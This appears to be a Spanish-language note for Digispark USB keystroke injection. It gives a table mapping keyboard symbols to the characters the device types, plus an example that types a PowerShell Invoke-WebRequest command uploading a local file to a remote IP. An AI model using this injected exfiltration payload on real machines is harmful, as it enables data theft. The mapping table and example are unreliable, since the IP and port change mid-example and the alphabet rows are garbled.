---
icon: clipboard-list
---

# Lista de signos Digispark

En el dispositivo `Digispark` hay muchas veces que los simbolos del teclado no los pilla como realmente son, ya que utiliza otro tipo de teclado a diferencia del `QWERTY`, por lo que he creado una lista de simbolos, caracteres, signos, etc... Para que se corresponda con lo que quereis programar en vuestro `Digispark`:

```
------------------LISTA DE SIGNOS DIGISPARK------------------

Signo COMA = ,
Signo PUNTO = .
Signo SLASH(/) = -
Signo GUION = '
Signo IGUAL(=) = ¡
Signo INTERROGACION(?) = _
Signo ESCLAMACION_ABAJO = !
Signo GUION_BAJO(_) = ?
Signo MENOR(<) = ;
Signo MAYOR(>) = :
Signo DOS_PUNTOS = Ñ
Signo PUNTO_COMA = ñ
Signo MAS(+) = ¿
Signo I_INGLESA(&) = /
Signo C_RARA(Ç) = gv
Signo CORCHETES_ABRIR_CERAR([]) = `+
Signo CORCHETES_CIRCULARES_ABRIR_CERRAR({}) = ^*
Signo HASHTAG = ·
Signo ABRIR_CERRAR_PARENTESIS(()) = )=
Signo DOLLAR = $
Signo PORCENTAJE = %
Signo ASTERISCO(*) = (
Signo C_RARA_MINUSCULA(ç) = g
Signo SIMBOLO_ORDINAL_MASCULINO(º) = 5
Signo SIMBOLO_ORDINAL_FEMENINO(ª) = ç
Signo ABECEDARIO_MINUSCULA_a-z bcdefghijklmngopqrstuvwxyz
Signo ABECEDARIO_MAYUSCULA_A-Z = ABCDEFGHIJKLMNgROPQRSTUVXYZ
Signo NUMEROS_0-9 = 0123456789
Signo ELEVADO(^) = &
Signo COMA_FRANCESA(`) = º
Signo ACENTO(´) = f

------------------------------------------------------------------
```

Hay muchos signos que se quedan como un `null` por lo que no estan implementados en la lista, la parte de la columna izquierda corresponde a los signos normales del teclado `QWERTY` y la columna de la derecha corresponde al signo del `Digispark`.

> EJEMPLO:

Si por ejemplo queremos escribir un comando mediante el `Digispark` algo tal que asi...

```powershell
Invoke-WebRequest -Uri "http://10.11.15.5:8080" -Method Post -InFile "test.txt" -ContentType "multipart/form-data"
```

En la programacion tendria que ser algo tal que asi...

```cpp
// Escribir el comando Invoke-WebRequest en fragmentos

    DigiKeyboard.print("Invoke/WebRequest");

    DigiKeyboard.delay(100);

    DigiKeyboard.sendKeyStroke(KEY_SPACE); // Añadir espacio

    DigiKeyboard.delay(100);

    DigiKeyboard.print("/Uri -http");

    DigiKeyboard.delay(100);

    // Enviar ':' usando SHIFT + .

    DigiKeyboard.sendKeyStroke(KEY_PERIOD, MOD_SHIFT_LEFT);

    DigiKeyboard.delay(100);

    DigiKeyboard.print("&&192.168.1.47");

    DigiKeyboard.delay(100);

    // Enviar ':' usando SHIFT + .

    DigiKeyboard.sendKeyStroke(KEY_PERIOD, MOD_SHIFT_LEFT);

    DigiKeyboard.delay(100);

    DigiKeyboard.print("8000-");

    DigiKeyboard.sendKeyStroke(KEY_SPACE); // Añadir espacio

    DigiKeyboard.delay(100);

    DigiKeyboard.print("/Method Post ");

    DigiKeyboard.delay(100);

    DigiKeyboard.print("/InFile ");

    DigiKeyboard.delay(100);

    DigiKeyboard.print("test.txt");

    DigiKeyboard.delay(500);

    DigiKeyboard.sendKeyStroke(0x4F); // 0x4F es el código para la tecla de flecha derecha

    DigiKeyboard.sendKeyStroke(KEY_SPACE); // Añadir espacio

    DigiKeyboard.delay(100);

    DigiKeyboard.print("/ContentType multipart&form/data");

    DigiKeyboard.delay(100);

    DigiKeyboard.sendKeyStroke(KEY_ENTER);
```

Tendremos que sustituir cada simbolo de lo que queremos poner por el que interpreta `Digispark`.
